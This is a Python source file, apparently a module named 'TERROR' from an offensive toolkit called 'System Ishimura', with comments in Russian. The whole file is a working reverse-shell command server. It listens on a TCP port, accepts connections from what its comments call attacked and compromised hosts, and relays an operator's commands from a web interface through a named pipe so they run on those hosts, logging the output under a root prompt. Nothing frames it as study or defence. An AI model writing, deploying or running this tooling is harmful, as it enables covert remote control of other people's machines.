#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ==============================================================================
# SYSTEM ISHIMURA — MODULE: TERROR [ASYNC INTERACTIVE REVERSE SHELL SERVER]
# ==============================================================================

import os
import sys
import socket
import select
import json

BASE_DIR = "/opt/ishimura"
TERROR_CONFIG_PATH = os.path.join(BASE_DIR, "modules/terror/config.json")
SESSION_PIPE_IN = "/tmp/terror_shell_in.fifo"
SESSION_PIPE_OUT = "/tmp/terror_shell_out.log"

def run_reverse_shell_listener():
    with open(TERROR_CONFIG_PATH, 'r') as f:
        cfg = json.load(f)
        
    bind_ip = cfg.get("listener_ip", "0.0.0.0")
    bind_port = cfg.get("listener_port", 4444)
    
    # Создаем именованные каналы (FIFO) для связи веб-интерфейса Hatsumi с сокет-сессией
    if not os.path.exists(SESSION_PIPE_IN): os.mkfifo(SESSION_PIPE_IN)
    # Сбрасываем старый лог вывода консоли
    with open(SESSION_PIPE_OUT, 'w', encoding='utf-8') as f: f.write("")

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((bind_ip, bind_port))
    server.listen(5)
    server.setblocking(False)
    
    print(f"[+] [TERROR KERNEL] TCP-слушатель сессий развернут на {bind_ip}:{bind_port}")
    with open(SESSION_PIPE_OUT, 'a', encoding='utf-8') as f:
        f.write(f"[*] [ЛИСТЕНЕР АКТИВИРОВАН] Ожидание подключения сессии на порту {bind_port}...\n")

    inputs = [server]
    client_sock = None
    client_addr = None

    while True:
        readable, writable, exceptional = select.select(inputs, [], inputs, 0.5)
        
        for s in readable:
            if s is server:
                # Принимаем входящую сессию от атакованного хоста
                conn, addr = s.accept()
                conn.setblocking(False)
                inputs.append(conn)
                client_sock = conn
                client_addr = addr
                msg = f"\n[+] [СЕССИЯ ХВАТА АКТИВИРОВАНА] Удаленный хост {addr[0]} успешно подключился!\nroot@{addr[0]}:~# "
                with open(SESSION_PIPE_OUT, 'a', encoding='utf-8') as f: f.write(msg)
            else:
                # Читаем вывод терминала от удаленного хоста
                try:
                    data = s.recv(4096)
                    if data:
                        with open(SESSION_PIPE_OUT, 'a', encoding='utf-8') as f:
                            f.write(data.decode('utf-8', errors='ignore'))
                    else:
                        # Если сокет закрылся, удаляем сессию
                        inputs.remove(s)
                        s.close()
                        if s == client_sock: client_sock = None
                        with open(SESSION_PIPE_OUT, 'a', encoding='utf-8') as f: f.write("\n[-] [ВНИМАНИЕ] Сессия управления хостом разорвана.\n")
                except:
                    inputs.remove(s)
                    s.close()

        # Проверяем, прислал ли оператор команду из веб-интерфейса через FIFO-канал
        # Используем неблокирующий опрос pipe
        try:
            fifo_fd = os.open(SESSION_PIPE_IN, os.O_RDONLY | os.O_NONBLOCK)
            cmd = os.read(fifo_fd, 1024).decode('utf-8', errors='ignore').strip()
            os.close(fifo_fd)
            
            if cmd and client_sock:
                # Отправляем команду в сокет на выполнение внутри скомпрометированного хоста
                client_sock.sendall((cmd + "\n").encode('utf-8'))
                # Логируем ввод команды для сохранения структуры терминала
                with open(SESSION_PIPE_OUT, 'a', encoding='utf-8') as f:
                    f.write(f"\nroot@{client_addr[0]}:~# {cmd}\n")
        except OSError:
            pass

if __name__ == "__main__":
    try:
        run_reverse_shell_listener()
    except KeyboardInterrupt:
        sys.exit(0)
